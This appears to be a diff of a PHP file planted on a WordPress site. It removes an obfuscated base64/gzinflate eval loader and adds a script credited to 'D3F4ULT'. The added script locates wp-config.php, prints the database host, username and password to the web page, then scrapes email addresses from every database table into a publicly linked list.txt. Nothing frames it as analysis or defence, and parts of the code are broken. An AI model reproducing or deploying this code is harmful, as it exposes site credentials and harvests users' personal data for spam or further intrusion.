@@ -1,9 +1,108 @@
-<?php function dyn($ovQ)
-{ 
-$ovQ=gzinflate(base64_decode($ovQ));
- for($i=0;$i<strlen($ovQ);$i++)
- {
-$ovQ[$i] = chr(ord($ovQ[$i])-1);
- }
- return $ovQ;
- }eval(dyn("rVfrbtpKEH4AJN5hZVHZVsBOe/rnxCkNaZwmEpQKk+boJMhyzBqsGtus14egKs/evfiCryFHXUVid+ab2W931jMTAMjodlR14kYYImCEezCxXO/Hh24H2usACER7vsYbb0h+begT0PDcAmsEnU+iR4wU/IzFIbWJMLjcg6u/rj/ejefnqjU8f0LUSk3MBa3bcR0gOa4HTfhMbCNJ2IUDO/Add6WE61CQQYCAJCiK2iRvV72qPQZwJKYKk7udX90OvdEeF4NPwELI2ktcSkfpwP0DTcVhSXmE/jjI0ai3ACtYDpU1/usECFr2Gkjp1VgR6O1CspA54FfuukdfCLm7C/ZSVhCbBIbJ24ukxETLwfRFXYQIrsyNhe21JKji1aX5bTTRxT4QVaHP3bEYXkCCcxPInaHPihA593rAhg41G+sgwmpp/H9sj0LISeFz6AVLKAmU2M3UmFNiGS/tNSNZo1gqfni/aIJz/elCa6AbRxC1k6WIMtn0FhvJVow4WSquI5vAub6RbGhF0S5Ay2auFFHm+n1kGPfT2VUr34oh50vFdXwTONc3X277KBrxvLt8GrDAnSUBpMlU0BqQ7NbOkttrRTK+ZwnvOqT6x0bR7yqQ2EGS2CdX2gdCWkSE8t2SEoGlQ+ELn5If8ge9CGb5lh/PBUuSJ376wQ6cqeDRf/Tp4Ri623Fi38Zu4DcS4c+hkMJpDtrso63n0gzkQxvXmaYUe05IDJwghL7EnJFnZomZ1g5in36Hp6lgaWHryYogfT8kydGlJBg303twNZqPLkeGbgjV9Jlb0QyarpLUFSKX7JFJtWpqJQqvZkey31g3wPVsOsnNCxHJGSQu6PZs2pw2yZm9eONXt/syHd9NvpX3U7i/ykM4rB3cH92bz+UitESAkYAb2pwUOOhj/cs8dcFZVGiA+xt9pmegmf5V/+c7EB9Gg39PB38r5ruTweLkIl2S+aNCFwuxwr94hoQOPQKbylVwzSnSUkfeFWnBzP8slHjqg+vb8VyfmT9G41vycHRTn4xux7Jc76PBdeq+UEgFhW+hCLRG1hRjXjVlQCWuH0Ot2Tl//icnLRBnh1wMideQZAW+M/mC5QaLl3oxTwtvPHkWHHb8KPRI4hHUx4i1Bhg+Y5mFK8Lk81rJzX5atqiLH/f3xgAeuVdTQPmefyKib4hsfYQ5lZYQvxLqFlWNuCR6qSsrjKPtBRHjmNLKSgBXHPSfCOIY+ckNaKzQ5GUmSTY9YptXFQS3sYugJBZ65bxIeK7/k2SqUtFJmsI+SBouNkm7Gbag/W7mZHtQt7YxRHuJ+e0zKikIwSj2cPYfSirfrWnvTcrMgQ8HkudjclxvK9c07NzZw4J2Qsu8DXopXhNH8Xv6PPwN"));?>
+<?php
+echo " 
+<html>
+<center><a href='list.txt'>Mailst By D3F4ULT</a><br>
+</html>
+";
+if (file_exists("wp-config.php") or ("../wp-config.php") or ("../../wp-config.php") or ("../../../wp-config.php") or ("../../../../wp-config.php") or ("../../../../../wp-config.php") or ("../../../../../../wp-config.php"))
+{
+    $config = array(
+        "wp-config.php",
+        "../wp-config.php",
+        "../../wp-config.php",
+        "../../../wp-config.php",
+        "../../../../wp-config.php",
+        "../../../../../wp-config.php",
+        "../../../../../../wp-config.php"
+    );
+    foreach ($config as $wpcon)
+    {
+        $file = @file_get_contents($wpcon);
+        if (@preg_match("/'DB_NAME', '/", $file) or @eregi("/'DB_USER', '/", $file))
+        {
+            //////////host////////////////
+            //////////host////////////////
+            $host = explode("'DB_HOST', '", $file);
+            $host = explode("');", $host[1]);
+            $host = $host[0];
+            /////////user///////////////
+            $user = explode("'DB_USER', '", $file);
+            $user = explode("');", $user[1]);
+            $user = $user[0];
+            ////////password///////////
+            $pass = explode("'DB_PASSWORD', '", $file);
+            $pass = explode("');", $pass[1]);
+            $pass = $pass[0];
+            ///////////////////////////////////////
+            echo "db-host : $host <br>";
+            echo "db-user : $user <br>";
+            echo "db-pass : $pass <br>";
+            //////////////////////////////////////////////////////////////////////////
+            go($host, $user, $pass, "list.txt");
+            exit();
+        }
+    }
+}
+else
+{
+    echo "i dontknow :/ \n\n";
+
+}
+
+function go($host, $user, $pass, $file)
+{
+    $con = @mysqli_connect($host, $user, $pass);
+    $fp = fopen($file, 'a');
+    $count = 0;
+    $databases = getdata("SHOW DATABASES");
+    foreach ($databases as $database)
+    print $database;
+    {
+        $tables = getdata("SHOW TABLES FROM $database");
+        foreach ($tables as $table)
+        {
+            $columns = getdata("SHOW COLUMNS FROM $database.$table");
+            foreach ($columns as $column)
+            {
+                $emails = getdata("SELECT $column FROM  $database.$table WHERE $column REGEXP '[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]'");
+                foreach ($emails as $email)
+                {
+                    if (filter_var($email, FILTER_VALIDATE_EMAIL))
+                    {
+                        if (preg_match("/".$email."/", file_get_contents($file))) continue;
+                        $count++;
+                        fwrite($fp, "$email\n");
+                    }
+                    else
+                    {
+                        foreach (preg_split("/\s/", $text) as $string)
+                        {
+                            if (filter_var($string, FILTER_VALIDATE_EMAIL))
+                            {
+                                if (preg_match("/".$string."/", file_get_contents($file))) continue;
+                                $count++;
+                                fwrite($fp, "$string\n");
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    fclose($fp);
+    @mysqli_close($con);
+    return $count;
+}
+function getdata($sql)
+{
+    require('wp-config.php');
+    $link = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
+    $q = @mysqli_query($link,$sql);
+    $result = array();
+    while ($d = @mysqli_fetch_array($q))
+    {
+        $result[] = $d[0];
+    }
+    return $result;
+}
+?>
